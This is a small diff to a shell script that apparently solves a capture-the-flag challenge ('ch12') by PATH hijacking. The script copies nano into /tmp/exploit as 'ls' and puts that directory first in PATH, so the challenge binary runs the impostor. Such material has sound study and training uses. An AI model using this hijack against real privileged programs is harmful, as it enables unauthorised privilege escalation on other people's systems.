@@ -16,6 +16,6 @@ mkdir -pv /tmp/exploit
 
 cp -avr $(which nano) /tmp/exploit/ls
 
-export PATH=/tmp/exploit
+export PATH=/tmp/exploit:$PATH
 
 ./ch12
